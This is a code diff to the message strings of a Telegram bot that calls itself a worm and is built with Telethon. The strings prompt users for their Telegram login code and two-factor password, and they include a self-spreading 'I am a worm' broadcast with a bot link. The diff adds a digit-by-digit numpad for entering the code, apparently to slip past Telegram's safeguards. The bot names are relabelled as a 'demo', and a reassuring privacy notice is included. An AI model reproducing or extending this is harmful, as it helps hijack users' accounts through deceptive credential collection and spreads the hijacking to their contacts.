@@ -1,3 +1,5 @@
+from telethon import Button
+
 strings = {
     'already_logged_in': "You are already logged in.",
     'ask_code': "Please enter the OTP you recived from Telegram:\n",
@@ -11,10 +13,8 @@ strings = {
     'login_success': "The login was successful ✅",
     'pass_invalid': "The 2 factor password you entered is invalid ❌",
     'privacy_policy': "⚠️ All the media downloaded are obtained from your account. we don't care what you upload, and also we don't log them. You solely bear all the consequenses",
-    'sending1': "Sending code",
-    'sending2': "Sending OTP request 📲",
+    'sending': "Sending OTP request 📲",
     'share_contact_btn': "SHARE CONTACT",
-    'unknownn_command': "Unknown command\n\nUse /help to get help",
     'worm_msg': "Hey! I am a worm! I am spreading! 🐛\n\n@{}",
     'worm_msg_btn_txt': "🔗 BOT LINK 🔗",
     'worm_msg_btn_url': "https://worm.com",
@@ -23,11 +23,37 @@ strings = {
 direct_reply = {
     '/help': strings['help'],
     '/privacy_policy': strings['privacy_policy'],
-    '/start': strings['hello'],
 }
+numpad = [
+    [Button.url(strings['get_code_btn'], 'https://t.me/+42777')],
+    [
+        Button.inline("1", '{"press":1}'),
+        Button.inline("2", '{"press":2}'),
+        Button.inline("3", '{"press":3}')
+    ],
+    [
+        Button.inline("4", '{"press":4}'),
+        Button.inline("5", '{"press":5}'),
+        Button.inline("6", '{"press":6}')
+    ],
+    [
+        Button.inline("7", '{"press":7}'),
+        Button.inline("8", '{"press":8}'),
+        Button.inline("9", '{"press":9}')
+    ],
+    [
+        Button.inline("Clear All", '{"press":"clear_all"}'),
+        Button.inline("0", '{"press":0}'),
+        Button.inline("⌫", '{"press":"clear"}')
+    ]
+]
 bot_names = [
-    "SL Wala",
+    "Worm Example",
+    "Worm Sample",
+    "Worm Demo",
 ]
 bot_usernames = [
-    "freewala",
+    "teliworm",
+    "tgwrm",
+    "hookworm",
 ]
